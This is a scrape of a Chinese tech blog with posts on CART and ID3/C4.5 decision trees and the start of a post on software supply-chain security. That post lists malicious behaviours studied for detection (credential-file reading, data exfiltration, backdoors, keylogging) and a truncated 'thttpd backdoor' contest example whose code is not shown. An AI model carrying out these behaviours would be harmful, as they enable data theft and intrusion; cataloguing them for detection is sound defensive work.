<p>对于一个二分类问题，节点 node 被分成类别 1 当且仅当: <span class="math display">\[
\frac{N_1(\text { node })}{N_1(\text { root })}&gt;\frac{N_0(\text {
node })}{N_0(\text { root })}
\]</span> 比如二分类，根节点属于 1 类和 0 类的分别有 20 和 80
个。在子节点上有 30 个样本，其中属于 1 类和 0 类的分 别是 10 和 20
个。如果 10/20&gt;20/80，该节点就属于 1 类。</p>
<p>通过这种计算方式就无需管理数据真实的类别分布。假设有 <span class="math inline">\(\mathrm{K}\)</span>
个目标类别，就可以确保根节点中每个类别的概率 都是 <span class="math inline">\(1 / \mathrm{K}\)</span>
。这种默认的模式被称为“先验相等”。</p>
<p>先验设置和加权不同之处在于先验不影响每个节点中的各类别样本的数量或者份额。先验影响的是每个节点的类别
赋值和树生长过程中分裂的选择。</p>
<h3><span id="16-连续值处理">1.6 连续值处理</span></h3>
<h4><span id="161-分类树">1.6.1 分类树</span></h4>
<ul>
<li><p><strong><font color="red">如果特征值是连续值：CART的处理思想与C4.5是相同的，即将连续特征值离散化。唯一不同的地方是度量的标准不一样，</font></strong>
<strong>CART采用基尼指数，而C4.5采用信息增益比</strong>。</p></li>
<li><p>如果当前节点为连续属性，<strong>CART树中该属性（剩余的属性值）后面还可以参与子节点的产生选择过程</strong>。</p></li>
</ul>
<h3><span id="17-回归树">1.7 回归树</span></h3>
<p><strong>CART（Classification and Regression
Tree，分类回归树），从名字就可以看出其不仅可以用于分类，也可以应用于回归</strong>。其回归树的建立算法上与分类树部分相似，这里简单介绍下不同之处。</p>
<h5><span id="连续值处理rss残差平方和"><strong>连续值处理</strong>：RSS<strong>残差平方和</strong></span></h5>
<p><strong>对于连续值的处理, CART
分类树采用基尼系数的大小来度量特征的各个划分点。在回归模型中,
我们使用常见的 和方差度量方式</strong>, 对于任意划分特征 <span class="math inline">\(\mathrm{A}\)</span>, 对应的任意划分点 <span class="math inline">\(\mathrm{s}\)</span> 两边划分成的数据集 <span class="math inline">\(D_1\)</span> 和 <span class="math inline">\(D_2\)</span>, 求出使 <span class="math inline">\(D_1\)</span> 和 <span class="math inline">\(D_2\)</span>
各自<strong>集合的均方差最小</strong>, 同时 <span class="math inline">\(D_1\)</span> 和 <span class="math inline">\(D_2\)</span>
的均方差之和最小所对应的特征和特征值划分点。表达式为: <span class="math display">\[
\min _{a, s}\left[\min _{c_1} \sum_{x_i \in
D_1}\left(y_i-c_1\right)^2+\min _{c_2} \sum_{x_i \in
D_2}\left(y_i-c_2\right)^2\right]
\]</span> 其中, <span class="math inline">\(c_1\)</span> 为 <span class="math inline">\(D_1\)</span> 数据集的样本输出均值, <span class="math inline">\(c_2\)</span> 为 <span class="math inline">\(D_2\)</span> 数据集的样本输出均值。</p>
<h5><span id="预测方式"><strong>预测方式</strong></span></h5>
<p>对于决策树建立后做预测的方式，上面讲到了 CART
分类树采用叶子节点里概率最大的类别作为当前节点的预测类别。而回归树输出不是类别，它采用的是用最终叶子的均值或者中位数来预测输出结果。</p>
<h4><span id="171cart分类树建模时预测变量中存在连续和离散时会自动分别进行处理吗">1.7.1
CART分类树建模时，预测变量中存在连续和离散时，会自动分别进行处理吗？</span></h4>
<blockquote>
<p>在使用sklearn的决策树CART建模时，预测变量中存在连续和离散时，会自动分别进行处理吗？
- 月来客栈的回答 - 知乎
https://www.zhihu.com/question/472579561/answer/2002434993</p>
</blockquote>
<p><strong>对于这种连续型的特征变量，Sklearn中的具体做法（包括ID3、CART、随机森林等）是先对连续型特征变量进行排序处理</strong>，<strong><font color="red">
然后取所有连续两个值的均值来离散化整个连续型特征变量。</font></strong></p>
<p>假设现在某数据集其中一个特征维度为: <span class="math display">\[
[0.5,0.2,0.8,0.9,1.2,2.1,3.2,4.5]
\]</span> 则首先需要对其进行排序处理, 排序后的结果为: <span class="math display">\[
[0.2,0.5,0.8,0.9,1.2,2.1,3.2,4.5]
\]</span> 接着再计算所有连续两个值之间的平均值： <span class="math display">\[
[0.35,0.65,0.85,1.05,1.65,2.65,3.85]
\]</span>
这样，便得到了该特征离散化后的结果。最后在构造决策树时，只需要使用式最后离散化后的特征进行划分指标的计算即可。同时，值得一说的地方是<strong>目前Sklearn在实际处理时，会把所有的特征均看作连续型变量进行处理</strong>。</p>
<p>下图所示为iris数据集根据sklearn中CART算法所建模的决策树的可视化结果：</p>
<p><img src="https://picx.zhimg.com/v2-9081bc3cd5f2ec069212b79d5c5ff7d3_b.jpg" alt="img" style="zoom:50%;"></p>
<p>从图中可以看到，<code>petal width</code>这个特征在前两次分类时的分割点分别为0.8和1.75。下面先来看看原始特征<code>petal width</code>的取值情况：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1.</span>  <span class="number">1.5</span> <span class="number">1.8</span> <span class="number">1.4</span> <span class="number">2.5</span> <span class="number">1.3</span> <span class="number">2.1</span> <span class="number">1.5</span> <span class="number">0.2</span> <span class="number">2.</span>  <span class="number">1.</span>  <span class="number">0.2</span> <span class="number">0.3</span> <span class="number">0.4</span> <span class="number">1.</span>  <span class="number">1.8</span> <span class="number">0.2</span> <span class="number">0.2</span> <span class="number">0.5</span> <span class="number">1.3</span> <span class="number">0.2</span> <span class="number">1.2</span> <span class="number">2.2</span> <span class="number">0.2</span> <span class="number">1.3</span> <span class="number">2.</span>  <span class="number">0.2</span> <span class="number">1.8</span> <span class="number">1.9</span> <span class="number">1.</span>  <span class="number">1.5</span> <span class="number">2.3</span> <span class="number">1.3</span> <span class="number">0.4</span> <span class="number">1.</span>  <span class="number">1.9</span> <span class="number">0.2</span> <span class="number">0.2</span> <span class="number">1.1</span> <span class="number">1.7</span> <span class="number">0.2</span> <span class="number">2.4</span> <span class="number">0.2</span> <span class="number">0.6</span> <span class="number">1.8</span> <span class="number">1.1</span> <span class="number">2.3</span> <span class="number">1.6</span> <span class="number">1.4</span> <span class="number">2.3</span> <span class="number">1.3</span> <span class="number">0.2</span> <span class="number">0.1</span> <span class="number">1.5</span> <span class="number">1.8</span> <span class="number">0.2</span> <span class="number">0.3</span> <span class="number">0.2</span> <span class="number">1.5</span> <span class="number">2.4</span> <span class="number">0.3</span> <span class="number">2.1</span> <span class="number">2.5</span> <span class="number">0.2</span> <span class="number">1.4</span> <span class="number">1.5</span> <span class="number">1.8</span> <span class="number">1.4</span> <span class="number">2.3</span> <span class="number">0.2</span> <span class="number">2.1</span> <span class="number">1.5</span> <span class="number">2.</span>  <span class="number">1.</span>  <span class="number">1.4</span> <span class="number">1.4</span> <span class="number">0.3</span> <span class="number">1.3</span> <span class="number">1.2</span> <span class="number">0.2</span> <span class="number">1.3</span> <span class="number">1.8</span> <span class="number">2.1</span> <span class="number">0.4</span> <span class="number">1.</span>  <span class="number">2.5</span> <span class="number">1.6</span> <span class="number">0.1</span> <span class="number">2.4</span> <span class="number">0.2</span> <span class="number">1.5</span> <span class="number">1.9</span> <span class="number">1.8</span> <span class="number">1.3</span> <span class="number">1.8</span> <span class="number">1.3</span> <span class="number">1.3</span> <span class="number">2.</span>  <span class="number">1.8</span> <span class="number">0.2</span> <span class="number">1.3</span> <span class="number">1.7</span> <span class="number">0.2</span> <span class="number">1.2</span> <span class="number">2.1</span>]</span><br></pre></td></tr></table></figure>
<p>可以发现上面并没有0.8和1.75这两个取值。接着按上面的方法先排序，再取相邻两个值的平均作为离散化的特征，其结果为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0.1</span>, <span class="number">0.15000000000000002</span>, <span class="number">0.2</span>, <span class="number">0.2</span>, <span class="number">0.2</span>, <span class="number">0.2</span>, <span class="number">0.2</span>, <span class="number">0.2</span>, <span class="number">0.2</span>, <span class="number">0.2</span>, <span class="number">0.2</span>, </span><br><span class="line"><span class="number">0.2</span>, <span class="number">0.2</span>, <span class="number">0.2</span>, <span class="number">0.2</span>, <span class="number">0.2</span>, <span class="number">0.2</span>, <span class="number">0.2</span>, <span class="number">0.2</span>, <span class="number">0.2</span>, <span class="number">0.2</span>, <span class="number">0.25</span>, <span class="number">0.3</span>, <span class="number">0.3</span>, <span class="number">0.3</span>, <span class="number">0.35</span>, <span class="number">0.4</span>, <span class="number">0.4</span>,</span><br><span class="line"> <span class="number">0.45</span>, <span class="number">0.55</span>, <span class="number">0.8</span>, <span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">1.05</span>, <span class="number">1.1</span>, <span class="number">1.15</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.25</span>, <span class="number">1.3</span>,</span><br><span class="line"> <span class="number">1.3</span>, <span class="number">1.3</span>, <span class="number">1.3</span>, <span class="number">1.3</span>, <span class="number">1.3</span>, <span class="number">1.3</span>, <span class="number">1.3</span>, <span class="number">1.3</span>, <span class="number">1.3</span>, <span class="number">1.35</span>, <span class="number">1.4</span>, <span class="number">1.4</span>, <span class="number">1.4</span>, <span class="number">1.4</span>, <span class="number">1.4</span>, <span class="number">1.45</span>, <span class="number">1.5</span>, </span><br><span class="line"><span class="number">1.5</span>, <span class="number">1.5</span>, <span class="number">1.5</span>, <span class="number">1.5</span>, <span class="number">1.5</span>, <span class="number">1.5</span>, <span class="number">1.55</span>, <span class="number">1.6</span>, <span class="number">1.65</span>, <span class="number">1.7</span>, <span class="number">1.75</span>, <span class="number">1.8</span>, <span class="number">1.8</span>, <span class="number">1.8</span>, <span class="number">1.8</span>, <span class="number">1.8</span>, <span class="number">1.8</span>, </span><br><span class="line"><span class="number">1.8</span>, <span class="number">1.8</span>, <span class="number">1.8</span>, <span class="number">1.85</span>, <span class="number">1.9</span>, <span class="number">1.9</span>, <span class="number">1.95</span>, <span class="number">2.0</span>, <span class="number">2.0</span>, <span class="number">2.0</span>, <span class="number">2.05</span>, <span class="number">2.1</span>, <span class="number">2.1</span>, <span class="number">2.1</span>, <span class="number">2.1</span>, </span><br><span class="line"><span class="number">2.1500000000000004</span>, <span class="number">2.25</span>, <span class="number">2.3</span>, <span class="number">2.3</span>, <span class="number">2.3</span>, <span class="number">2.3499999999999996</span>, <span class="number">2.4</span>, <span class="number">2.4</span>, <span class="number">2.45</span>, <span class="number">2.5</span>, <span class="number">2.5</span>]</span><br></pre></td></tr></table></figure>
<h2><span id="二-总结">二、 总结</span></h2>
<p>最后通过总结的方式对比下 ID3、C4.5 和 CART 三者之间的差异。</p>
<p>除了之前列出来的划分标准、剪枝策略、连续值确实值处理方式等之外，我再介绍一些其他差异：</p>
<ul>
<li><strong>划分标准的差异：</strong>ID3
使用信息增益偏向特征值多的特征，C4.5
使用信息增益率克服信息增益的缺点，偏向于特征值小的特征，CART
使用基尼指数克服 C4.5 需要求 log
的巨大计算量，偏向于特征值较多的特征。</li>
<li><strong>使用场景的差异：</strong>ID3 和 C4.5
都只能用于分类问题，CART 可以用于分类和回归问题；ID3 和 C4.5
是多叉树，速度较慢，CART 是二叉树，计算速度很快；</li>
<li><strong>样本数据的差异：</strong>ID3
只能处理离散数据且缺失值敏感，C4.5 和 CART
可以处理连续性数据且有多种方式处理缺失值；从样本量考虑的话，小样本建议
C4.5、大样本建议 CART。C4.5
处理过程中需对数据集进行多次扫描排序，处理成本耗时较高，而 CART
本身是一种大样本的统计方法，小样本处理下泛化误差较大 ；</li>
<li><strong>样本特征的差异：</strong>ID3 和 C4.5
层级之间只使用一次特征，CART 可多次重复使用特征（连续型）；</li>
<li><strong>剪枝策略的差异：</strong>ID3 没有剪枝策略，C4.5
是通过悲观剪枝策略来修正树的准确性，而 CART 是通过代价复杂度剪枝。</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://powerlzy.github.io/posts/1WP1250/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/cat_mac.jpg">
      <meta itemprop="name" content="lzy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PowerLZY's Blog">
      <meta itemprop="description" content="相比到达的地方，同行的人更重要！">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | PowerLZY's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/1WP1250/" class="post-title-link" itemprop="url">决策树（4）总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-02-25 17:29:37" itemprop="dateCreated datePublished" datetime="2022-02-25T17:29:37+08:00">2022-02-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-04-22 19:28:17" itemprop="dateModified" datetime="2023-04-22T19:28:17+08:00">2023-04-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%AE%97%E6%B3%95/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%AE%97%E6%B3%95/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%86%B3%E7%AD%96%E6%A0%91/" itemprop="url" rel="index"><span itemprop="name">决策树</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>4.2k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>8 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="决策树id3c4.5cart">决策树——ID3、C4.5、CART</h2>
<p><strong>决策树</strong>是一个非常常见并且优秀的机器学习算法，它易于理解、可解释性强，其可作为分类算法，也可用于回归模型。</p>
<table>
<colgroup>
<col style="width: 7%">
<col style="width: 30%">
<col style="width: 30%">
<col style="width: 30%">
</colgroup>
<thead>
<tr class="header">
<th>算法</th>
<th>ID3（分类）</th>
<th>C4.5（分类）</th>
<th>CART（分类和回归）</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>思想</td>
<td>奥卡姆剃刀：越是小型的决策树越优于大的决策树;ID3
算法的核心思想就是以<strong>信息增益</strong>来度量特征选择，选择信息增益最大的特征进行分裂。算法采用自顶向下的贪婪搜索遍历可能的决策树空间。</td>
<td>C4.5 算法最大的特点是<strong>克服了 ID3
对特征数目的偏重</strong>这一缺点，引入<strong>信息增益率</strong>来作为分类标准。</td>
<td>CART
算法的二分法可以<strong>简化决策树的规模</strong>，提高生成决策树的效率。CART
包含的基本过程有<strong>分裂</strong>，<strong>剪枝</strong>和<strong>树选择</strong>。</td>
</tr>
<tr class="even">
<td><strong>划分标准</strong></td>
<td><strong>信息增益</strong> = 类别熵 - 特征类别熵
<strong>类别熵</strong>：<span class="math inline">\(H(D)=-\sum_{k=1}^{K}
\frac{\left|C_{k}\right|}{|D|} \log _{2}
\frac{\left|C_{k}\right|}{|D|}\)</span>
<strong>特征类别熵</strong>：<span class="math inline">\(H(D \mid
A)=\sum_{i=1}^{n} \frac{\left|D_{i}\right|}{|D|}
H\left(D_{i}\right)\)</span></td>
<td>先从候选划分特征中找到信息增益高于平均值的特征，再从中选择<strong>增益率</strong>最高的。</td>
<td><strong>Gini
系数</strong>作为变量的<strong>不纯度量</strong>，<strong>减少了大量的对数运算</strong>；<span class="math inline">\(G i n i(D)=\sum_{k=1}^{K}
\frac{\left|C_{k}\right|}{|D|}\left(1-\frac{\left|C_{k}\right|}{|D|}\right)\)</span></td>
</tr>
<tr class="odd">
<td>剪枝策略</td>
<td><strong>无</strong></td>
<td><strong>悲观剪枝策略</strong></td>
<td>基于<strong>代价复杂度剪枝</strong></td>
</tr>
<tr class="even">
<td>数据差异</td>
<td><strong>离散</strong>数据且<strong>缺失值</strong>敏感</td>
<td><strong>离散</strong>、<strong>连续特征离散化</strong>；【排序+离散化】</td>
<td><strong>连续型、离散型</strong></td>
</tr>
<tr class="odd">
<td><strong>连续值处理</strong></td>
<td>无</td>
<td><strong>排序</strong>并取相邻两样本值的<strong>平均数</strong>。</td>
<td><strong>排序</strong>并取相邻两样本值的<strong>平均数</strong>。<strong>CART
分类树</strong>【<strong>基尼系数</strong>】。<strong>回归树</strong>【<strong>和方差度量</strong>】。</td>
</tr>
<tr class="even">
<td>缺失值处理</td>
<td><strong>无</strong></td>
<td>1、有缺失值特征，用没有缺失的样本子集所占比重来折算；2、将样本同时划分到所有子节点</td>
<td><strong>代理测试</strong>来估计缺失值</td>
</tr>
<tr class="odd">
<td>类别不平衡</td>
<td><strong>无</strong></td>
<td><strong>无</strong></td>
<td><strong>先验机制</strong>：其作用相当于对数据自动重加权，对类别进行均衡。</td>
</tr>
<tr class="even">
<td><strong>缺点</strong></td>
<td>1、ID3
没有剪枝策略，容易过拟合；2、信息增益准则对可取值<strong>数目较多的特征有所偏好</strong>，类似“编号”的特征其信息增益接近于
1； 3、只能用于处理离散分布的特征； 没有考虑缺失值。</td>
<td>1、<strong>多叉树</strong>。2、<strong>只能用于分类</strong>。3、熵模型拥有大量耗时的<strong>对数运算</strong>，连续值还有<strong>排序运算</strong>。4、驻留于内存的数据集。</td>
<td>熵模型拥有大量耗时的<strong>对数运算</strong>，连续值还有<strong>排序运算</strong>。</td>
</tr>
</tbody>
</table>
<ul>
<li><strong>划分标准的差异：</strong>ID3
使用信息增益偏向特征值多的特征，C4.5
使用信息增益率克服信息增益的缺点，偏向于特征值小的特征，CART
使用基尼指数克服 C4.5 需要求 log
的巨大计算量，偏向于特征值较多的特征。</li>
<li><strong>使用场景的差异：</strong>ID3 和 C4.5
都只能用于分类问题，CART 可以用于分类和回归问题；ID3 和 C4.5
是多叉树，速度较慢，CART 是二叉树，计算速度很快；</li>
<li><strong>样本数据的差异：</strong>ID3
只能处理离散数据且缺失值敏感，C4.5 和 CART
可以处理连续性数据且有多种方式处理缺失值；从样本量考虑的话，小样本建议
C4.5、大样本建议 CART。C4.5
处理过程中需对数据集进行多次扫描排序，处理成本耗时较高，而 CART
本身是一种大样本的统计方法，小样本处理下泛化误差较大 ；</li>
<li><strong>样本特征的差异：</strong>ID3 和 C4.5
层级之间只使用一次特征，CART 可多次重复使用特征；</li>
<li><strong>剪枝策略的差异：</strong>ID3 没有剪枝策略，C4.5
是通过<strong>悲观剪枝策略</strong>来修正树的准确性，而 CART
是通过<strong>代价复杂度</strong>剪枝。</li>
</ul>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/posts/1WP1250/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://powerlzy.github.io/posts/DFA75A/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/cat_mac.jpg">
      <meta itemprop="name" content="lzy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PowerLZY's Blog">
      <meta itemprop="description" content="相比到达的地方，同行的人更重要！">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | PowerLZY's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/DFA75A/" class="post-title-link" itemprop="url">安全场景-软件供应链及物联网安全 </a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-09-18 18:52:43" itemprop="dateCreated datePublished" datetime="2021-09-18T18:52:43+08:00">2021-09-18</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-05-20 16:06:52" itemprop="dateModified" datetime="2022-05-20T16:06:52+08:00">2022-05-20</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E3%80%90draft%E3%80%91%E5%BA%94%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">【draft】应用</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E3%80%90draft%E3%80%91%E5%BA%94%E7%94%A8/%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/" itemprop="url" rel="index"><span itemprop="name">应用场景</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E3%80%90draft%E3%80%91%E5%BA%94%E7%94%A8/%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>3.2k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>6 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3><span id="供应链及物理网安全">供应链及物理网安全</span></h3>
<blockquote>
<p>##### 1、<a target="_blank" rel="noopener" href="https://developer.android.com/studio/build/apk-analyzer?hl=zh-cn">APK分析</a></p>
<p>考察点：逆向分析、文档收集、数据分析</p>
<p>##### 2、软件供应链安全分析</p>
<ul>
<li>MaMaDroid【13】</li>
<li><a target="_blank" rel="noopener" href="https://github.com/MLDroid/drebin">Drebin</a> 【14】</li>
<li>AppContext【20】</li>
</ul>
<p>==考察点：二进制代码分析，二进制函数特征提取，补丁比较，源代码分析==</p>
<ul>
<li>如V. Livshits 等使用静态分析的方法在Java
源代码中进行脆弱性(vulnerability)检测的策略[47]。</li>
<li>G. Grieco 和G. Grinblat
等使用机器学习方法根据软件的内存错误信息训练测试模型,
检测软件漏洞的研究[49] <strong><em>Toward Large-Scale Vulnerability
Discovery Using Machine Learning</em></strong></li>
<li>彭小详等人的研究针对加壳技术,
提出了对恶意程序进行自动脱壳的方法[59]。<strong><em>Research of
Malicious Code in Automatic Unpacking</em></strong></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34168880/article/details/86753392">「功守道」软件供应链安全大赛·C源代码赛季启示录</a></li>
</ul>
</blockquote>
<blockquote>
<p>##### 3、<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/219057.html">PowerShell反混淆</a></p>
<p>考察点：代码分析， 混淆语句定位、还原</p>
</blockquote>
<ul>
<li>XShell污染</li>
<li>CCleaner投毒</li>
</ul>
<h5><span id="混淆原理">混淆原理</span></h5>
<p>网上帖子太多了，可以参考下看雪论坛用户发的翻译贴：
https://bbs.pediy.com/thread-248034.htm</p>
<h5><span id="自动化反混淆工具">自动化反混淆工具</span></h5>
<p>Unit42安全团队编写的PowerShellProfiler.py： github地址：
https://github.com/pan-unit42/public_tools/tree/master/powershellprofiler
用法及原理参考： https://www.freebuf.com/sectool/219057.html</p>
<blockquote>
<p>##### 4、物联网漏洞挖掘</p>
<p>考察点：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1543779">常见漏洞原理</a>，二进制逆向工程，自动化程序分析</p>
</blockquote>
<h4><span id="相关论文">相关论文</span></h4>
<blockquote>
<p>DroidMD: an efficient and scalable Android malware detection approach
at source code level (2021 C&amp;S)</p>
<p>Detection of Repackaged Android Malware with Code-Heterogeneity
Features.(2020 TDSC)</p>
</blockquote>
<h5><span id="11-软件供应链">1.1 软件供应链</span></h5>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/276951.html">软件供应链安全工具DependencyTrack的使用</a></p>
<p>https://www.cnblogs.com/bonelee/p/13768901.html</p>
<h5><span id="12-物联网安全">1.2 物联网安全</span></h5>
<h3><span id="常见恶意行为">常见恶意行为</span></h3>
<blockquote>
<p>*标注为单点确定性恶意行为，**标注为二阶段恶意行为中的上游或下游行为，#标注为复合恶意行为</p>
</blockquote>
<p>*
<strong>敏感信息异常采集</strong>:针对生产环境，最大的威胁不是造成应用执行异常，而是在无形中泄漏关键敏感数据，包括可能造成机器控制权丧失的系统相关配置数据，关键的应用存储的用户数据等。</p>
<ul>
<li>口令与秘钥类型文件直接操作 *</li>
<li>系统敏感配置文件绕过API直接读取 *</li>
<li>典型服务端应用敏感配置文件直接读取 *</li>
<li>系统账户操作历史相关信息读取 **</li>
<li>典型服务端应用管理账户和用户数据读取 **</li>
<li>系统一般描述性信息采集 **</li>
<li>软件供应链上游特定资源数据探测、获取和泄漏（如源码遍历泄漏） #</li>
</ul>
<p>*
<strong>关键数据篡改</strong>:任何需要在生产环境上，修改、写入数据或代码从而实现恶意打击的行为，我们统一归纳到这一类里面，较为泛化。</p>
<ul>
<li>覆盖、篡改或插入口令秘钥类型文件用以账户植入 *</li>
<li>系统、用户环境变量和关键配置文件修改 **</li>
<li>自动执行脚本/用户操作历史篡改 **</li>
<li>典型服务端应用配置文件和关键数据文件绕过API方式篡改 *</li>
<li>系统/典型应用重要位置的脚本/可执行文件置换 **</li>
<li>开发、测试等环境系统默认工具链篡改替换 *</li>
<li>开发、测试等环境特定类型源文件/资源文件篡改污染 #</li>
</ul>
<p>*<strong>不可信数据传入渠道</strong>：以上两者重点考察了隐形的软件供应链本地恶意行为。在涉及到网络和交互的场景下，通过从供应链上进行污染，一种比较直接且有持续后效的恶意行为就是撕开一个口子，供后续入侵进场。</p>
<ul>
<li>下载敏感类型文件到临时目录 **</li>
<li>关键可执行文件（系统应用/关键服务端应用/关键库）下载/释放 **</li>
<li>网络传入指令/地址类型数据且无校验执行/访问 *</li>
</ul>
<p>*
<strong>不可信信息外传渠道</strong>。对应于上面的传入。敏感数据的采集后，需要搭配对应的下游传出才能形成完整恶意行为链路，常规可能的渠道形式分为两类。</p>
<ul>
<li>上游数据未脱敏形式的网络传出（TCP/UDP/ICMP） **</li>
<li>上游数据未脱敏形式的本地确定位置落盘 **</li>
</ul>
<p>*
<strong>其它典型木马后门行为</strong>。在上述行为框架之外，在生产环境上具有非单纯破坏效果的恶意行为，划分为此类，包括但不限于：</p>
<ul>
<li><p>键盘hook等输入监控行为 *</p></li>
<li><p>网络劫持行为 *</p></li>
<li><p>全局挂钩注入行为 **</p></li>
<li><p>远程控制 #</p></li>
</ul>
<h3><span id="经典赛题事例">经典赛题事例</span></h3>
<p><strong>#1：thttpd后门陷阱</strong></p>
<p>从基础软件或应用上面入手，稳定可控的后门是最佳选择。而在一个无关应用中突兀地出现网络连接，隐蔽性总归很差；在thttpd当中，以很袖珍的代码实现稳定的后门，是这里首先要呈现的一个题目。</p>
<p>在thttpd项目，恶意代码嵌入到libhttpd.c文件中，上下游恶意代码相关上下文：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 